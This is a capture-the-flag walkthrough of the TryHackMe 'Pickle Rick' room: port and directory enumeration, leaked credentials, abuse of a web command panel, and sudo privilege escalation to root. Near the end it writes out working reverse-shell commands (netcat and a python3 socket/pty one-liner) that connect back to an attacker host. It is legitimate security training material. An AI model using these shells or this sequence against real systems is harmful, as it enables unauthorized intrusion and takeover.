# Pickle Rick
#### Author : [ar33zy](https://tryhackme.com/p/ar33zy)
#### Date : 09/03/2024
#### Link : https://tryhackme.com/room/picklerick
Note : the IP of the machine could be different for you !

## Challenge
### Enumeration 
First, let's perform a scan of the machine with `nmap -vv -T 5 -sV -sC -oN nmap.txt 10.10.124.198` to see if any port is open.

- `-vv` : Having minimum verbose mode
- `-T 5` : Scan with full speed
- `-sV`: Attempts to determine the version of the service running on port
- `-sC` : Scan with default NSE scripts. Considered useful for discovery and safe
- `-oN` : Normal output to the file nmap.txt
- `-Pn` : Treat all hosts as online

We have in particular this result :
``` bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 89:e4:90:3e:b6:0d:c9:fd:29:24:97:46:2b:d6:e6:21 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+XDw5CP11Y39wljhiuevTwERd1/cdjAnxT8W37tl8vXUUFXiyot534/LCS9fNhnkobbOnJXunLMsBHj2smsyJ/YKcCoeMr4AhxHQlCSKG9dHBNuFUl7ycx6bF9MTJtuW/2fZJrXNZu7eQjDI20AtzKB2VhTKq1AaZPN5QM2WCu/8hWQrBU9LFZtT+ttXarKHSKLRfGBf8j/KpXGiT7l4rWaJ+bPcxQsLMdgtAhUthXIFt2h7nLlD5iAhyusjnMNCoz2+oiWmzWhQZtFWV3XGKq14BLxLQT3Dgb4vea3ULLgOeofcN3ayiYGIzOQTwMe2LurfJzSRWamkMFBTdfNYJ
|   256 5d:8a:88:d1:80:3d:59:f6:30:a5:92:3e:bf:a5:f6:be (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE4sTiXZtlabMSYNh64mm25Z3DttXe/hUnW0fbwumnfmpdMFDhsw27FQK+X/zD5GoIXU2lxQq3pTwBvRLzGnWho=
|   256 fb:bb:64:3f:4e:ef:4a:d6:e1:e5:43:99:f5:94:90:11 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMmhfyGqQfA/pOL+9IJRBqqHBZcN0ggLt0IuL09eUqUq
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can conclude from this that 2 ports are open : 22 and 80.

Port 22 is SSH. Since we don't have any information about users, we will skip it for now.

Port 80 is HTTP, which means a website is up at this port. Let's check if we can have some information here.

### Website (Port 80)
#### Discovery
When we go at URL **10.10.124.198:80**, we arrive at this page :

![Website](images/Pickle_rick.png)

We seem to have nothing... A first thing to do in every website is then to check the source code.

There seem to be a comment here that tell us an interesting information.

<details>
    <summary>Clue</summary>
  
```html
  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

</details>

We keep it for later.

Now, a good thing to do is enumerating the website to search for **hidden subdomains**. I will use Gobuster for that : `gobuster dir -u http://10.10.124.198/ -w SecLists/Discovery/Web-Content/common.txt -x.php,.txt`.

I recommand that you use [Seclists](https://github.com/danielmiessler/SecLists) to brute-force with Gobuster. 

The result is the following :
```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.124.198/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/.htaccess            (Status: 403) [Size: 297]
/.htaccess.php        (Status: 403) [Size: 301]
/.hta.php             (Status: 403) [Size: 296]
/.hta.txt             (Status: 403) [Size: 296]
/.htaccess.txt        (Status: 403) [Size: 301]
/.htpasswd            (Status: 403) [Size: 297]
/.htpasswd.php        (Status: 403) [Size: 301]
/.htpasswd.txt        (Status: 403) [Size: 301]
/assets               (Status: 301) [Size: 315] [--> http://10.10.124.198/assets/]
/denied.php           (Status: 302) [Size: 0] [--> /login.php]
/index.html           (Status: 200) [Size: 1062]
/login.php            (Status: 200) [Size: 882]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/robots.txt           (Status: 200) [Size: 17]
/robots.txt           (Status: 200) [Size: 17]
/server-status        (Status: 403) [Size: 301]
Progress: 14169 / 14172 (99.98%)
===============================================================
Finished
===============================================================
```
There are some interesting subdomains : /robots.txt, /login.php and portal.php .

When we go on /robots.txt, we find another nice clue.

<details>
    <summary>Clue 2</summary>
  
```
Wubbalubbadubdub
```

</details>

/login.php and /portal.php send us both to /login.php.

![](images/login.jpg)



Let's try to login with the credentials we had earlier.
**User** : R1ckRul3s
**Password** : Wubbalubbadubdub

Bingo !


#### Login.php
![](images/command_panel.jpg)

If we try to navigate between the different sections, we see that only command is accessible for us. Let's try some commands then !

What if we try to list all files with `ls` ?
```bash
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```
There seem to be some interesting files here. We can also note that it seems to replicate bash commands, which means we could try to connect with a reverse shell.

Let's try `cat Sup3rS3cretPickl3Ingred.txt` !

```bash
Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
```

Hmm, it seems that we can't do cat. Maybe something similar like `less Sup3rS3cretPickl3Ingred.txt` ?

And here we go ! We now have the **third ingredient** !

We have another clue through clue.txt :
<details>
    <summary>Clue</summary>
Look around the file system for the other ingredient.
    
</details>

Let's mess around with the files then.

I want to know where we are : `pwd`
```bash
/var/www/html
```

Now, let's see if there is anything in the home directory : `ls /home`.
```bash
rick
ubuntu
```

Let's see what files there are in rick : `ls /home/rick`.
```bash
second ingredients
```

Let's try to enter second : `cd /home/rick/second`.
```bash
No response
```

Maybe it's a full file ? Let's verify : `file /home/rick/'second ingredients` (` allow us to take the space into account).
```bash
/home/rick/second ingredients: ASCII text
```

Ok, it seems to be a simple texte file. We can then open it with `less /home/rick/'second ingredients`.<br>
This way, we have the **second ingredient**.

But what about now ?

Maybe we can try to make a reverse shell like we said earlier. Let's try our best commands from https://www.revshells.com/.

On our machine, let's start to listen for a connection : `nc -lvnp 1234`.

Then, let's try a simple `nc IP_LOCAL_MACHINE 1234 -e sh`.

No response.

After trying different commands, we find that python3 works : `export RHOST="IP_LOCAL_MACHINE";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'` 

And boom ! Reverse shell activated !

Let's do some privilege escalation. What does `sudo -l` tells us ?
```bash
Matching Defaults entries for www-data on
    ip-10-10-0-186.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-0-186.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

We learn a very interesting fact here. We can run every command as anyone. Let's create a shell as root then : `sudo /bin/bash`.

...And here we go ! We now have root access over the machine. Let's see what we have in the root folder : `ls /root`.
```bash
3rd.txt  snap
```

And there, we have the **last ingredient**.







